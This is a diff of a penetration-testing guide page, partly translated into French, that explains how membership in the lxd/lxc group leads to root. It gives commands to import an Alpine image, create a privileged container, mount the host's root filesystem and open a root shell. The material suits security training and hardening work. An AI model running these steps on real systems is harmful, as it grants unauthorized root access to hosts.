@@ -1,18 +1,16 @@
-# lxd/lxc Group - Privilege escalation
+# Groupe lxd/lxc - Élévation de privilèges
 
-{{#include ../../../banners/hacktricks-training.md}}
+L'appartenance au groupe de gestion LXD de l'hôte (normalement _**lxd**_) peut fournir un moyen d'obtenir les privilèges root en permettant un contrôle total du daemon.<sup>[[1]](#references)</sup>
 
-If you belong to _**lxd**_ **or** _**lxc**_ group, you can become root
-
-## Exploiting without internet
+## Exploitation sans Internet
 
 ### Method 1
 
-You can download an alpine image to use with lxd from a trusted repository.
-Canonical publishes daily builds in their site: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-Just grab both **lxd.tar.xz** and **rootfs.squashfs** from the newest build. (Directory name is the date).
+Vous pouvez télécharger une image Alpine à utiliser avec LXD depuis un repository de confiance.  
+Le serveur d'images LXD de Canonical publie des builds quotidiens : [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
+Récupérez simplement **lxd.tar.xz** et **rootfs.squashfs** du build le plus récent (le nom du répertoire correspond à la date).<sup>[[8]](#references)</sup>
 
-Alternativelly you can install in your machine this distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (follow the instructions of the github):
+Vous pouvez également installer distrobuilder sur votre machine en suivant les [instructions du projet](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +33,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Téléversez les fichiers **incus.tar.xz** (**lxd.tar.xz** si vous les avez téléchargés depuis le dépôt Canonical) et **rootfs.squashfs**, ajoutez l’image au dépôt et créez un conteneur :
+Téléversez **incus.tar.xz** (**lxd.tar.xz** si vous l’avez téléchargé depuis le serveur d’images Canonical) et **rootfs.squashfs**, puis importez l’image et créez un conteneur.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -52,9 +50,9 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > Si vous rencontrez cette erreur _**Error: No storage pool found. Please create a new storage pool**_\
-> Exécutez **`lxd init`** et configurez toutes les options par défaut. Puis **répétez** le bloc de commandes précédent.
+> Exécutez **`lxd init`**, configurez un storage pool par défaut, puis **répétez** le chunk précédent de commandes.<sup>[[2]](#references)</sup>
 
-Enfin, vous pouvez exécuter le container et obtenir root :
+Enfin, démarrez le container et ouvrez un shell root sur le système de fichiers de l’hôte :<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -62,7 +60,7 @@ lxc exec privesc /bin/sh
 ```
 ### Méthode 2
 
-Construisez une image Alpine et démarrez-la avec l'indicateur `security.privileged=true`, forçant le container à interagir en tant que root avec le système de fichiers de l'hôte.
+Construisez une image Alpine et démarrez-la avec le flag `security.privileged=true`, ce qui mappe le root du container vers le root de l’hôte ; monter `/` expose ensuite le système de fichiers de l’hôte dans le container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -82,4 +80,15 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
+## References
+
+- [1] [Comment renforcer la sécurité de LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [2] [Conteneurs et machines virtuelles LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
+- [3] [Comment copier et importer des images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
+- [5] [Comment créer des images avec distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Définition d’image Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [7] [Script de build lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [8] [Serveur d’images LXD](https://images.lxd.canonical.com/)
+- [9] [Type : disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
